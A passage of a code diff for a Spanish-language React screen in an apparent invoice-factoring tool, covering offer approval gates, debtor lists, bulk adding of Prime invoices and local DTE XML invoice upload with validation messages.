+                                    <span className="rounded-full px-1.5 t7 font-bold text-white" style={{ backgroundColor: ok ? "#16A34A" : fg, fontVariantNumeric: "tabular-nums" }}>{ok ? total : pend}</span>
+                                  </span>
+                                  )}
+                                </span>
+                              );
+                              // Las otras dos compuertas, en el formato que pidió el negocio: quién tiene
+                              // observaciones y cuántas reglas cumplieron; cuántas facturas y de cuántos deudores
+                              // quedan por verificar.
+                              const otorgQuien = otorgRes.cliente && otorgRes.deudores.length ? `El cliente y ${otorgRes.deudores.length} deudor(es)`
+                                : otorgRes.cliente ? "El cliente" : otorgRes.deudores.length ? `${otorgRes.deudores.length} deudor(es)` : "Sin observaciones";
+                              const otorgOk = !otorgRes.cliente && !otorgRes.deudores.length;
+                              const verifOkTodo = verifRes.facturas.length === 0;
+                              return (
+                                <>
+                                <div className="mt-3 t10 uppercase tracking-wide" style={{ color: C.faint }}>Resumen</div>
+                                {/* Aprobada entera, la tarjeta se gana un verde más presente: el #F0FDF4 de los
+                                    chips es correcto para una etiqueta pero desaparece en un bloque de este
+                                    tamaño, y el veredicto es lo primero que hay que poder leer de la pantalla. */}
+                                <div className="mt-1.5 rounded-xl p-3" style={vd.tono === "con_linea" ? { backgroundColor: "#DCFCE7", border: "1px solid #86EFAC" } : { backgroundColor: t.bg, border: `1px solid ${t.bd}` }}>
+                                  <div className="flex items-start gap-3">
+                                    <div style={{ flex: 1, minWidth: 0 }}>
+                                      <div className="t13 font-bold" style={{ color: t.fg }}>{vd.tit}</div>
+                                      <div className="mt-0.5 t10" style={{ color: C.sub, lineHeight: 1.45 }}>{vd.sub}</div>
+                                    </div>
+                                    {!bloqueado && validas.length > 0 && !reevalPend && (
+                                        <div className="relative flex shrink-0 items-stretch">
+                                          {/* Split button: la etiqueta ejecuta la acción puesta, el chevron abre el
+                                              menú para cambiarla. Antes el botón entero abría el menú, así que decía
+                                              «Cerrar oferta y publicar» y al presionarlo no cerraba nada. */}
+                                          <button onClick={() => ejecutarAccion(accionSel, { evalLin, otorgRes, verifRes, validas })} className="flex items-center py-1.5 t11 font-semibold text-white" style={{ backgroundColor: C.indigo, borderRadius: "9999px 0 0 9999px", paddingLeft: 16, paddingRight: 12 }}>{labelAccion(accionSel)}</button>
+                                          <button onClick={() => setAccMenu((v) => !v)} title="Elegir otra acción" className="flex items-center py-1.5 text-white" style={{ backgroundColor: C.indigo, borderRadius: "0 9999px 9999px 0", paddingLeft: 6, paddingRight: 12, borderLeft: "1px solid rgba(255,255,255,.35)" }}><ChevronDown size={14} /></button>
+                                          {accMenu && panelAcciones(true)}
+                                        </div>
+                                    )}
+                                  </div>
+                                  {/* Pie: las TRES compuertas que deciden si esto se puede girar —otorgamiento,
+                                      verificación y línea— cada una con lo que falta sobre el total. Antes iban
+                                      tres montos (oferta / cursable / comité) que el propio titular ya dice. */}
+                                  <div className="mt-2.5 flex flex-wrap items-center gap-x-6 gap-y-2 border-t pt-2" style={{ borderColor: vd.tono === "con_linea" ? "#86EFAC" : t.bd }}>
+                                    {compuerta("Otorgamiento", otorgOk, "Criterios aprobados", "Criterios por aprobar", otorgRes.nPend, otorgRes.total, "#7C3AED", "#f5f3ff",
+                                      otorgOk ? `Todas las reglas del motor de otorgamiento cumplen (${otorgRes.ok}/${otorgRes.total}).` : `Con observaciones: ${otorgQuien.toLowerCase()}. Reglas aprobadas ${otorgRes.ok} de ${otorgRes.total}. Se resuelven en el tab Otorgamiento.`)}
+                                    <span style={{ width: 1, height: 22, backgroundColor: vd.tono === "con_linea" ? "#86EFAC" : t.bd }} />
+                                    {compuerta("Verificación", verifOkTodo, "Facturas verificadas", "Facturas por verificar", verifRes.facturas.length, validas.length, "#EF4444", "#FEF2F2",
+                                      verifOkTodo ? "Ninguna factura de la oferta requiere verificación telefónica." : `${verifRes.facturas.length} factura(s) de ${verifRes.nDeudores} deudor(es) necesitan verificación telefónica antes de girar.`)}
+                                    <span style={{ width: 1, height: 22, backgroundColor: vd.tono === "con_linea" ? "#86EFAC" : t.bd }} />
+                                    {compuerta("Línea", nSinLinea === 0, "Deudores con línea", "Deudores requieren línea", nSinLinea, deudOf.length, "#7C3AED", C.lilac,
+                                      nSinLinea === 0 ? "Todos los deudores de la oferta tienen línea disponible para su monto." : `${nSinLinea} de ${deudOf.length} deudor(es) no alcanzan con la línea vigente: su parte requiere comité.`)}
+                                  </div>
+                                </div>
+                                </>
+                              );
+                            })()}
+                            <div className="mt-4 t10 uppercase tracking-wide" style={{ color: C.faint }}>Condiciones comerciales</div>
+                            <div className="mt-1.5 overflow-hidden rounded-xl" style={{ border: `1px solid ${C.line}` }}>
+                              <SimResumen deal={deal} o={o} montoDocs={montoValido} cantFacturas={validas.length} usuario={USERS[usuario] || usuario} bloqueado={bloqueado} antic={antic} setAntic={setAntic} comisO={comisO} setComisO={setComisO} tasaPond={tasaPond} diasPond={diasPond} reevalPend={reevalPend} onReevaluar={() => setReevalPend(false)} esJefe={esJefeComercial(usuario)} usuarioCod={usuario} deudoresOp={validas} tasaFuente={{ usaUltNeg, riesgo: tasaPondRiesgo, ultNeg: tul }} colapsable />
                             </div>
-                            <div className="mt-3 border-t pt-1.5" style={{ borderColor: "#FED7AA" }}>
-                              <div className="mt-1.5 t10 uppercase tracking-wide" style={{ color: C.faint }}>Deudores en la oferta ({dq ? `${deudOfF.length} de ${deudOf.length}` : deudOf.length})</div>
+                            </div>
+                            {/* Velo tintado sobre la sección atenuada: con sólo `opacity` el contenido se
+                                aclaraba pero el fondo seguía blanco, así que la sección no se delimitaba
+                                del resto de la pantalla. Va absoluto —no mueve nada al aparecer— y con
+                                `pointer-events-none` para no tapar el botón, que se dibuja después. */}
+                            {(reevalPend || !deal.simulado) && (
+                              <div className="pointer-events-none absolute rounded-xl" style={{ top: -10, left: -14, right: -14, bottom: -10, backgroundColor: "rgba(209,207,216,0.55)", border: `1px solid ${C.line}` }} />
+                            )}
+                            {!deal.simulado ? (
+                              <div className="absolute inset-0 flex items-center justify-center p-2">
+                                <div className="rounded-xl bg-white p-3" style={{ border: `1px solid ${C.line}`, boxShadow: "0 10px 30px rgba(16,12,40,.14)", maxWidth: 640 }}>
+                                  {simIni ? (
+                                    <div className="flex items-center gap-3" style={{ paddingRight: 8 }}>
+                                      <RotateCcw size={16} className="pl-spin" style={{ color: C.indigo }} />
+                                      <div>
+                                        <div className="t12 font-semibold" style={{ color: C.ink }}>Simulando la oferta…</div>
+                                        <div className="mt-0.5 t10" style={{ color: C.sub }}>{simIni.lab} · {simIni.n} factura{simIni.n === 1 ? "" : "s"} — calculando asignación de línea, tasa, descuentos y monto a girar.</div>
+                                      </div>
+                                    </div>
+                                  ) : (<>
+                                  <div className="t12 font-semibold" style={{ color: C.ink }}>¿Qué facturas quieres incluir en la oferta?</div>
+                                  <div className="mt-0.5 t10" style={{ color: C.sub }}>Al elegir se arma la oferta y se simula: asignación de línea, tasa, descuentos y monto a girar. Después puedes ajustarla factura a factura.</div>
+                                  {opcionesInicio.length ? (
+                                    /* Una opcion por linea: son alternativas excluyentes que se comparan
+                                       leyendo la misma cifra en la misma posicion, y en fila se rompian
+                                       en dos renglones desalineados. */
+                                    <div className="mt-2 flex flex-col items-start gap-1.5">
+                                      {opcionesInicio.map((o2) => (
+                                        <button key={o2.k} onClick={() => elegirInicio(o2.fs, o2.lab)} disabled={bloqueado} title={o2.tip}
+                                          className="inline-flex items-center gap-1.5 rounded-full px-3 py-1.5 t10 font-semibold disabled:opacity-40 disabled:cursor-not-allowed" style={{ backgroundColor: o2.bg, color: o2.fg }}>
+                                          <Plus size={12} /> {o2.lab} · {o2.fs.length} fact. · {fmtMM(o2.monto)}
+                                        </button>
+                                      ))}
+                                    </div>
+                                  ) : (
+                                    <div className="mt-2 t10" style={{ color: C.faint }}>Este cliente no tiene facturas disponibles para armar una oferta.</div>
+                                  )}
+                                  </>)}
+                                </div>
+                              </div>
+                            ) : reevalPend && !bloqueado && validas.length > 0 ? (
+                              <div className="absolute inset-0 flex items-center justify-center">
+                                <button onClick={reevaluarLinea} disabled={detReeval} className="inline-flex items-center gap-1.5 rounded-full px-4 py-2 t11 font-semibold text-white" style={{ backgroundColor: detReeval ? C.faint : C.indigo, boxShadow: "0 6px 16px rgba(112,62,255,.28)" }}>
+                                  <RotateCcw size={13} className={detReeval ? "animate-spin" : ""} /> {detReeval ? "Re-evaluando…" : "Re-evaluar operación"}
+                                </button>
+                              </div>
+                            ) : null}
+                            </div>
+                            {/* El buscador y el alta masiva de Prime son controles DE esta lista, así que
+                                comparten su línea de título en vez de flotar arriba como una barra suelta. */}
+                            <div className="mt-6 flex flex-wrap items-center justify-between gap-2">
+                              {/* El título ya cuenta los DEUDORES; los dos chips completan la selección con
+                                  las otras dos cifras —facturas y monto— en la misma línea. Antes eran una
+                                  caja de tres bloques que repetía el conteo de deudores y le robaba altura
+                                  a la lista, que es el contenido real de la pantalla. */}
+                              <div className="flex flex-wrap items-center gap-2">
+                                <span className="t10 font-semibold uppercase tracking-wide" style={{ color: C.faint }}>Deudores en la oferta</span>
+                                <span className="inline-flex items-center rounded-full px-2 py-0.5 t9 font-semibold" style={{ backgroundColor: "#F5F4F8", color: C.sub, border: `1px solid ${C.line}` }}
+                                  title="Deudores con facturas en esta oferta">{dq ? `${deudOfF.length} de ${deudOf.length}` : deudOf.length} deudor{!dq && deudOf.length === 1 ? "" : "es"}</span>
+                                <span className="inline-flex items-center rounded-full px-2 py-0.5 t9 font-semibold" style={{ backgroundColor: "#F5F4F8", color: C.sub, border: `1px solid ${C.line}` }}
+                                  title="Facturas seleccionadas para esta oferta">{validas.length} factura{validas.length === 1 ? "" : "s"}</span>
+                                <span className="inline-flex items-center rounded-full px-2 py-0.5 t9 font-semibold" style={{ backgroundColor: C.lilac, color: C.indigo }}
+                                  title="Monto seleccionado para esta oferta">{fmtMM(totalOf)}</span>
+                              </div>
+                              <div className="flex items-center gap-2">
+                                <div className="flex items-center gap-1.5 rounded-full px-2.5 py-1.5" style={{ border: `1px solid ${C.line}`, backgroundColor: "#fff", width: 250 }}>
+                                  <Search size={12} style={{ color: C.faint }} />
+                                  <input value={detQuery} onChange={(e) => { setDetQuery(e.target.value); setDetOtrasPage(0); }} placeholder="Buscar empresa deudora o folio…" className="w-full bg-transparent t10 outline-none" style={{ color: C.ink }} />
+                                  {detQuery && <button onClick={() => { setDetQuery(""); setDetOtrasPage(0); }} style={{ color: C.faint }}><X size={12} /></button>}
+                                </div>
+                                {!bloqueado && (() => {
+                                  // Alta masiva de Prime: las facturas de deudores de Lista Blanca o Autorizados
+                                  // son las que no hay que pensar dos veces, así que se suman de una vez en lugar
+                                  // de fila por fila. El menú deja ver de quién es cada paquete antes de agregar.
+                                  const esPrime = (f) => { const td = tipoDeudorDisp(f); return td === "Lista Blanca" || td === "Deudor Autorizado"; };
+                                  // El monto se cuenta NETO de nota de crédito, que es como entra a la oferta:
+                                  // con el bruto el menú prometía una cifra y sumaba otra.
+                                  const netoDe = (f) => { const e = estadoCandidata(f, deal); return e.clave === "notaParcial" ? e.montoNeto : (f.montoMM || 0); };
+                                  // El deudor se clasifica con la MISMA factura que usa el chip ★ Prime del
+                                  // acordeón (la primera del grupo): si el chip dice Prime, el botón tiene que
+                                  // verlo. No se filtra por `f.otro` —ese flag se asigna al azar por factura y
+                                  // no guarda relación con el tipo del deudor, así que dejaba fuera a deudores
+                                  // Prime enteros—, sólo lo que de verdad no se puede agregar.
+                                  // Tramo del deudor: EL MISMO con que `asignarLineas` reparte la línea, para que el
+                                  // menú y el motor no puedan discrepar sobre quién tiene prioridad.
+                                  const tramoDe = (dn) => {
+                                    const f0 = (grpOt[dn] || [])[0];
+                                    if (!f0) return "resto";
+                                    if (esPrime(f0)) return "prime";
+                                    return notaFromScore(scoreDeudor(f0.deudor || "", tipoDeudorDisp(f0)).score) > NOTA_PRIORITARIA ? "notaAlta" : "resto";
+                                  };
+                                  const paquetes = Object.keys(grpOt).map((dn) => {
+                                    const g = (grpOt[dn] || []).filter((f) => estadoCandidata(f, deal).agregable);
+                                    if (!g.length) return null;
+                                    return { dn, tramo: tramoDe(dn), facturas: g, monto: +g.reduce((s2, f) => s2 + netoDe(f), 0).toFixed(1) };
+                                  }).filter(Boolean);
+                                  const ORDEN_TRAMO = { prime: 0, notaAlta: 1, resto: 2 };
+                                  paquetes.sort((a, b) => (ORDEN_TRAMO[a.tramo] - ORDEN_TRAMO[b.tramo]) || (b.monto - a.monto));
+                                  const bloqueTramo = (t) => {
+                                    const ps = paquetes.filter((pq) => pq.tramo === t);
+                                    return { paquetes: ps, facturas: ps.flatMap((pq) => pq.facturas),
+                                      n: ps.reduce((s2, pq) => s2 + pq.facturas.length, 0),
+                                      monto: +ps.reduce((s2, pq) => s2 + pq.monto, 0).toFixed(1) };
+                                  };
+                                  const TR = { prime: bloqueTramo("prime"), notaAlta: bloqueTramo("notaAlta"), resto: bloqueTramo("resto") };
+                                  const nFacPrime = TR.prime.n;
+                                  const nFacTodas = paquetes.reduce((s2, pq) => s2 + pq.facturas.length, 0);
+                                  // La normalización por nota de crédito se aplica UNA vez: si se aplicara de nuevo
+                                  // sobre una factura ya neteada, le volvería a restar la NC.
+                                  const normalizar = (f) => { const e = estadoCandidata(f, deal); return e.clave === "notaParcial" ? { ...f, montoMM: e.montoNeto, _ncAplicada: e.ncMonto } : f; };
+                                  const sumarNorm = (fsNorm) => { onIncorporarFacturas(deal.id, fsNorm); setReevalPend(true); setPrimeMenu(false); };
+                                  const sumar = (fs) => sumarNorm(fs.map(normalizar));
+                                  // Cuáles de las Prime entran en línea: se simula la oferta MÁS todas las Prime y
+                                  // se toman las que quedan CON_LINEA. Es el mismo escenario que produce «Agregar
+                                  // todas», así que las dos opciones no pueden contradecirse.
+                                  const primeNorm = TR.prime.facturas.map(normalizar);
+                                  const primeConLinea = (() => {
+                                    if (!evalLin || !primeNorm.length) return [];
+                                    const ev = asignarLineas([...validas, ...primeNorm], deal.rutEmisor);
+                                    const st2 = new Map((ev.facturas || []).map((x) => [x.id, x.estado]));
+                                    return primeNorm.filter((f) => st2.get(f.id) === "CON_LINEA");
+                                  })();
+                                  const totConLinea = +primeConLinea.reduce((s2, f) => s2 + (f.montoMM || 0), 0).toFixed(1);
+                                  // Contrapartida del alta: sacar de la oferta lo que se iría a comité. Es lo que
+                                  // la tarjeta de veredicto ya propone («quitarlas y cursar el resto hoy») y que
+                                  // hasta ahora había que hacer factura por factura desde cada acordeón.
+                                  const sinLinea = evalLin ? validas.filter((f) => evalFac[f.id] && evalFac[f.id].estado === "REQUIERE_COMITE") : [];
+                                  const montoSinLinea = +sinLinea.reduce((s2, f) => s2 + (f.montoMM || 0), 0).toFixed(1);
+                                  // La oferta no puede quedar vacía: si todo lo seleccionado va a comité, sacarlo
+                                  // dejaría la operación sin facturas y el motor no tendría qué evaluar.
+                                  const vaciaria = sinLinea.length > 0 && sinLinea.length >= validas.length;
+                                  const sacarSinLinea = () => { sinLinea.forEach((f) => onRetirarFactura(deal.id, f)); setReevalPend(true); setPrimeMenu(false); };
+                                  const hayAlgo = nFacTodas > 0 || sinLinea.length > 0;
+                                  // CARGA DE XML (DTE). El cliente manda los XML por correo y no había por dónde
+                                  // entrarlos: la oferta sólo se podía armar con lo que ya venía del inbound. Se
+                                  // parsea el documento REAL —un EnvioDTE puede traer varios <Documento>— y de
+                                  // cada uno salen folio, RUT del emisor y del receptor, tipo y monto.
+                                  const normRut = (r) => String(r || "").replace(/[.\s]/g, "").toUpperCase();
+                                  const txtDe = (el, tag) => { const n2 = el.getElementsByTagName(tag)[0]; return n2 ? (n2.textContent || "").trim() : ""; };
+                                  const foliosOp = new Set([...(deal.facturasOp || []), ...(deal.facturasDisponibles || [])].map((f) => String(f && f.folio)));
+                                  const cargarXml = async (files) => {
+                                    if (!files.length) return;
+                                    const nuevas = [], rech = [], vistos = new Set();
+                                    for (const file of files) {
+                                      let doc = null;
+                                      try { doc = new DOMParser().parseFromString(await file.text(), "application/xml"); } catch (e2) { doc = null; }
+                                      if (!doc || doc.getElementsByTagName("parsererror").length) { rech.push({ n: file.name, why: "no es un XML válido" }); continue; }
+                                      const docs = doc.getElementsByTagName("Documento");
+                                      const lista = docs.length ? Array.from(docs) : (doc.documentElement ? [doc.documentElement] : []);
+                                      if (!lista.length) { rech.push({ n: file.name, why: "no trae documentos" }); continue; }
+                                      for (const el of lista) {
+                                        const folio = txtDe(el, "Folio");
+                                        const mnt = +(txtDe(el, "MntTotal") || 0);
+                                        const tipoDTE = txtDe(el, "TipoDTE") || "33";
+                                        const rutEm = txtDe(el, "RUTEmisor"), rutRe = txtDe(el, "RUTRecep");
+                                        const razon = txtDe(el, "RznSocRecep") || rutRe;
+                                        const ref = folio ? "folio " + folio : file.name;
+                                        // Cada rechazo dice POR QUÉ: un XML que no entra sin explicación se lee
+                                        // como que la función está rota.
+                                        if (!folio || !(mnt > 0)) { rech.push({ n: ref, why: "sin folio o sin monto total" }); continue; }
+                                        if (tipoDTE !== "33" && tipoDTE !== "34") { rech.push({ n: ref, why: `tipo DTE ${tipoDTE}: no es una factura cedible` }); continue; }
+                                        if (deal.rutEmisor && normRut(rutEm) !== normRut(deal.rutEmisor)) { rech.push({ n: ref, why: `el emisor ${rutEm || "—"} no es el cliente de esta oportunidad` }); continue; }
+                                        if (foliosOp.has(String(+folio)) || vistos.has(folio)) { rech.push({ n: ref, why: "ya está en la oportunidad" }); continue; }
+                                        vistos.add(folio);
+                                        // El plazo sale del propio documento; sin FchVenc se usa el del deudor.
+                                        const fv = txtDe(el, "FchVenc");
+                                        const dv = fv ? Math.round((new Date(fv + "T00:00:00").getTime() - Date.now()) / 86400000) : NaN;
+                                        nuevas.push({
+                                          id: "XML-" + deal.id + "-" + folio, folio: +folio,
+                                          tipo: tipoDTE === "34" ? "Factura exenta (34)" : "Factura electrónica (33)",
+                                          deudor: razon, rutRecep: rutRe, rutEmisor: rutEm,
+                                          // Sin `tipoDeudor` el motor le niega la LF1 a un deudor de Lista Blanca.
+                                          tipoDeudor: tipoDeudor(rutRe, razon), histFactoring: null,
+                                          montoMM: +(mnt / 1e6).toFixed(1),
+                                          venc: isFinite(dv) ? Math.max(1, dv) : diasPagoDeudor(razon),
+                                          sinXml: false, xmlArchivo: file.name, // el XML ES el respaldo para ceder
+                                        });
+                                      }
+                                    }
+                                    if (nuevas.length) { onIncorporarFacturas(deal.id, nuevas); setReevalPend(true); }
+                                    setXmlRes({ ok: nuevas.length, rech, monto: +nuevas.reduce((s2, f) => s2 + f.montoMM, 0).toFixed(1) });
+                                    setPrimeMenu(false);
+                                  };
+                                  return (
+                                    <div className="relative">
+                                      {/* Ya no sólo ajusta la selección —también carga documentos—, así que el
+                                          botón se llama «Opciones». Y deja de deshabilitarse cuando no hay nada
+                                          que agregar ni sacar: cargar un XML no depende del pool, y era
+                                          justamente el caso en que más falta hace. */}
+                                      <button onClick={() => setPrimeMenu((v) => !v)}
+                                        title="Cargar XML del cliente, o agregar y sacar facturas de la oferta en bloque"
+                                        className="inline-flex items-center gap-1.5 whitespace-nowrap rounded-full px-3 py-1.5 t10 font-medium" style={{ border: `1px solid ${C.line}`, backgroundColor: "#fff", color: C.sub }}>
+                                        Opciones <ChevronDown size={13} />
+                                      </button>
+                                      {primeMenu && (
+                                        <div className="absolute right-0 z-30 mt-1 w-80 rounded-lg bg-white p-1 shadow-xl" style={{ border: `1px solid ${C.line}` }} onMouseLeave={() => setPrimeMenu(false)}>
+                                          <div className="px-2 py-1 t9 font-semibold uppercase tracking-wide" style={{ color: C.faint }}>Cargar documentos</div>
+                                          <label className="flex w-full cursor-pointer items-center justify-between gap-2 rounded-md px-2 py-1.5 t10 font-medium" style={{ backgroundColor: "#EFF6FF", color: "#2563EB" }}
+                                            title="Carga los XML (DTE) que envió el cliente: cada documento entra a la oferta con su folio, deudor, plazo y monto, y ya trae el respaldo para ceder">
+                                            <span className="inline-flex items-center gap-1"><Upload size={12} /> Cargar facturas desde XML</span>
+                                            <span className="t9 font-normal" style={{ color: C.faint }}>DTE 33 / 34</span>
+                                            <input type="file" multiple accept=".xml,text/xml,application/xml" className="hidden"
+                                              onChange={(e) => { const fs2 = Array.from(e.target.files || []); e.target.value = ""; cargarXml(fs2); }} />
+                                          </label>
+                                          {!hayAlgo && (
+                                            <div className="px-2 py-1.5 t9" style={{ color: C.faint }}>
+                                              {Object.keys(grpOt).length ? `Los ${Object.keys(grpOt).length} deudor(es) con facturas disponibles no tienen ninguna que se pueda agregar (anuladas por NC, cedidas o en otra operación).` : "No hay facturas por agregar ni facturas sin línea por sacar."}
+                                            </div>
+                                          )}
+                                          {hayAlgo && <div className="mx-2 my-1" style={{ borderTop: `1px solid ${C.line}` }} />}
+                                          {sinLinea.length > 0 && (<>
+                                            <div className="px-2 py-1 t9 font-semibold uppercase tracking-wide" style={{ color: C.faint }}>Sacar de la oferta</div>
+                                            <button onClick={sacarSinLinea} disabled={vaciaria}
+                                              title={vaciaria ? "Todas las facturas de la oferta van a comité: sacarlas la dejaría vacía" : `Quita ${sinLinea.length === 1 ? "la factura que no tiene línea" : `las ${sinLinea.length} facturas que no tienen línea`} y deja cursable el resto hoy`}
+                                              className="flex w-full items-center justify-between gap-2 rounded-md px-2 py-1.5 t10 font-medium text-left disabled:opacity-40 disabled:cursor-not-allowed" style={{ backgroundColor: "#F5F3FF", color: "#7C3AED" }}>
+                                              <span className="inline-flex items-center gap-1"><X size={12} /> Sacar facturas sin línea · {sinLinea.length} fact.</span><span>{fmtMM(montoSinLinea)}</span>
+                                            </button>
+                                            {nFacPrime > 0 && <div className="mx-2 my-1" style={{ borderTop: `1px solid ${C.line}` }} />}
+                                          </>)}
+                                          {nFacTodas > 0 && <div className="px-2 py-1 t9 font-semibold uppercase tracking-wide" style={{ color: C.faint }}>Agregar a la oferta</div>}
+                                          {/* Se muestra SIEMPRE que haya Prime, deshabilitada cuando ninguna cabe:
+                                              con la línea ajustada —el caso frecuente— ocultarla la volvía
+                                              invisible y parecía que la función no existía. */}
+                                          {nFacPrime > 0 && (
+                                            <button onClick={() => sumarNorm(primeConLinea)} disabled={primeConLinea.length === 0}
+                                              title={primeConLinea.length ? "Suma sólo las que caben en la línea: no manda nada a comité" : `Ninguna de las ${nFacPrime} facturas Prime disponibles cabe en la línea: agregarlas mandaría todo a comité`}
+                                              className="flex w-full items-center justify-between gap-2 rounded-md px-2 py-1.5 t10 font-medium text-left disabled:opacity-40 disabled:cursor-not-allowed" style={{ backgroundColor: "#F0FDF4", color: "#16A34A" }}>
+                                              <span className="inline-flex items-center gap-1"><Plus size={12} /> Agregar Prime con línea{primeConLinea.length ? ` · ${primeConLinea.length} fact.` : ""}</span><span>{primeConLinea.length ? fmtMM(totConLinea) : "ninguna cabe"}</span>
+                                            </button>
+                                          )}
+                                          {/* Un tramo por botón, en el orden en que el motor les asigna línea. El de
+                                              Prime se omite cuando TODAS las Prime caben: diría exactamente lo mismo
+                                              que «Agregar Prime con línea», que además promete que no va a comité. */}
+                                          {(() => {
+                                            const btnTramo = (k, lab, fg, bg) => {
+                                              if (!TR[k].n) return null;
+                                              if (k === "prime" && primeConLinea.length >= TR.prime.n) return null;
+                                              const nD = TR[k].paquetes.length;
+                                              return (
+                                                <button key={k} onClick={() => sumarNorm(TR[k].facturas.map(normalizar))}
+                                                  title={`Suma las ${TR[k].n} factura(s) disponibles de ${nD} deudor(es) de este tramo. Las que no quepan en la línea irán a comité.`}
+                                                  className="mt-1 flex w-full items-center justify-between gap-2 rounded-md px-2 py-1.5 t10 font-medium text-left" style={{ backgroundColor: bg, color: fg }}>
+                                                  <span className="inline-flex items-center gap-1"><Plus size={12} /> {lab} · {TR[k].n} fact.</span><span>{fmtMM(TR[k].monto)}</span>
+                                                </button>
+                                              );
+                                            };
+                                            return (<>
+                                              {btnTramo("prime", "Agregar facturas Prime", C.indigo, C.lilac)}
+                                              {btnTramo("notaAlta", "Agregar facturas ND>4,2", "#2563EB", "#EFF6FF")}
+                                              {btnTramo("resto", "Agregar otras facturas", "#6B7280", "#F3F4F6")}
+                                            </>);
+                                          })()}
+                                          <div className="mt-1 overflow-y-auto" style={{ maxHeight: 260 }}>
+                                            {paquetes.map((pq) => {
+                                              // La marca dice de qué tramo es el deudor sin gastar una línea de texto:
+                                              // ★ lila para Prime y un punto del color del tramo para los otros dos.
+                                              const mk = pq.tramo === "prime" ? { t: "★", c: C.indigo } : pq.tramo === "notaAlta" ? { t: "●", c: "#2563EB" } : { t: "●", c: "#9CA3AF" };
+                                              return (
+                                                <button key={pq.dn} onClick={() => sumar(pq.facturas)} className="flex w-full items-center justify-between gap-2 rounded-md px-2 py-1.5 t10 text-left hover:bg-stone-50" style={{ color: C.ink }}>
+                                                  <span className="truncate"><span style={{ color: mk.c }}>{mk.t}</span> {pq.dn} <span className="t9" style={{ color: C.faint }}>· {pq.facturas.length} fact.</span></span>
+                                                  <span className="shrink-0 t9 font-semibold" style={{ color: C.sub }}>{fmtMM(pq.monto)}</span>
+                                                </button>
+                                              );
+                                            })}
+                                          </div>
+                                        </div>
+                                      )}
+                                    </div>
+                                  );
+                                })()}
+                              </div>
+                            </div>
+                            {xmlRes && (
+                              <div className="mt-2 flex items-start justify-between gap-2 rounded-lg px-3 py-2" style={{ border: `1px solid ${xmlRes.ok ? "#bbf7d0" : "#FED7AA"}`, backgroundColor: xmlRes.ok ? "#F0FDF4" : "#FFF7ED" }}>
+                                <div className="min-w-0">
+                                  <div className="t10 font-semibold" style={{ color: xmlRes.ok ? "#16A34A" : "#C2410C" }}>
+                                    {xmlRes.ok ? `${xmlRes.ok} factura(s) incorporadas desde XML · ${fmtMM(xmlRes.monto)}` : "No se incorporó ninguna factura"}
+                                  </div>
+                                  {xmlRes.rech.length > 0 && (
+                                    <div className="mt-0.5 t9" style={{ color: C.sub, lineHeight: 1.5 }}>
+                                      {xmlRes.rech.slice(0, 6).map((r, i) => (<div key={i}>· <b>{r.n}</b>: {r.why}</div>))}
+                                      {xmlRes.rech.length > 6 && <div>· y {xmlRes.rech.length - 6} documento(s) más.</div>}
+                                    </div>
+                                  )}
+                                </div>
+                                <button onClick={() => setXmlRes(null)} title="Cerrar" className="shrink-0" style={{ color: C.faint }}><X size={13} /></button>
+                              </div>
+                            )}
+                            <div className="mt-2">
                               <div className="mt-1.5">
-                                {deudOfF.length === 0 && <div className="t10 py-2" style={{ color: C.faint }}>{dq ? `Sin deudores en la oferta que coincidan con «${detQuery}».` : "No hay deudores en la oferta."}</div>}
-                                {deudOfF.map((dn, idx) => { const grupo = grpOf[dn]; const key = "of:" + dn; const abierto = key in detOpen ? detOpen[key] : idx === 0; return (
+                                {/* La oferta nace vacia —la corrida ya no la propone—, asi que este es el
+                                    estado de ENTRADA de la pantalla, no un borde raro: se dibuja como caja
+                                    para que la seccion conserve su altura y el ojo no salte al pool. */}
+                                {deudOfF.length === 0 && (
+                                  <div className="flex items-center justify-center rounded-xl px-3 t10" style={{ minHeight: 56, backgroundColor: "#F7F7FA", border: `1px solid ${C.line}`, color: C.faint }}>
+                                    {dq ? `Ningún deudor de la oferta coincide con «${detQuery}».` : "Ninguna factura seleccionada"}
+                                  </div>
+                                )}
+                                {deudOfF.map((dn) => { const grupo = grpOf[dn]; const key = "of:" + dn; const abierto = detOpen[key] === true; return (
                                   <div key={dn} className="mb-2" style={{ border: "1px solid #E4E2EC", borderRadius: 12, overflow: "hidden", backgroundColor: "#F5F4F8" }}>
-                                    <button onClick={() => setDetOpen((m) => ({ ...m, [key]: !abierto }))} className="block w-full text-left">{cabDeudor(dn, grupo, abierto)}</button>
-                                    {abierto && <div className="overflow-x-auto" style={{ backgroundColor: "#FCFCFD", borderTop: `1px solid ${C.line}`, padding: "4px 14px 8px" }}><div style={{ minWidth: 560 }}>{headDoc}{grupo.map(filaDoc)}<div className="grid items-center gap-2 py-1.5 t10 font-semibold" style={{ gridTemplateColumns: GC_D, color: "#7C7A85", borderTop: "1px solid #E4E3E9" }}><span style={{ gridColumn: "1 / 5" }}>Subtotal ({grupo.length} fact.)</span><span className="text-right">{fmtMM(+grupo.reduce((s, f) => s + (f.montoMM || 0), 0).toFixed(1))}</span><span></span></div></div></div>}
+                                    <button onClick={() => setDetOpen((m) => ({ ...m, [key]: !abierto }))} className="block w-full text-left">{cabDeudor(dn, grupo, abierto, true)}</button>
+                                    {abierto && <div className="overflow-x-auto" style={{ backgroundColor: "#FCFCFD", borderTop: `1px solid ${C.line}`, padding: "4px 14px 8px" }}><div style={{ minWidth: 700 }}>{headDoc}{grupo.map(filaDoc)}<div className="grid items-center gap-2 py-1.5 t10 font-semibold" style={{ gridTemplateColumns: GC_D, color: "#7C7A85", borderTop: "1px solid #E4E3E9" }}><span style={{ gridColumn: "1 / 4" }}>Subtotal ({grupo.length} fact.)</span><span className="text-right">{fmtMM(+grupo.reduce((s, f) => s + (f.montoMM || 0), 0).toFixed(1))}</span><span style={{ gridColumn: "5 / 8" }}></span></div>{(() => {
+                                      // Facturas de ESTE deudor que aún no están en la oferta. Vivían sólo en la
+                                      // sección de abajo, así que sumarle una factura a un deudor ya presente
+                                      // obligaba a bajar y buscarlo de nuevo.
+                                      const otras = (grpOt[dn] || []).filter((f) => !f.otro);
+                                      if (!otras.length) return null;
+                                      const ab = otrasDeudor[dn] !== false;
+                                      const tot = +otras.reduce((s2, f) => s2 + (f.montoMM || 0), 0).toFixed(1);
+                                      return (
+                                        <div className="mt-2 rounded-lg" style={{ border: `1px dashed ${C.line}`, padding: "6px 8px" }}>
+                                          <button onClick={() => setOtrasDeudor((m) => ({ ...m, [dn]: !ab }))} className="flex w-full items-center justify-between t9 font-semibold" style={{ color: C.sub }}>
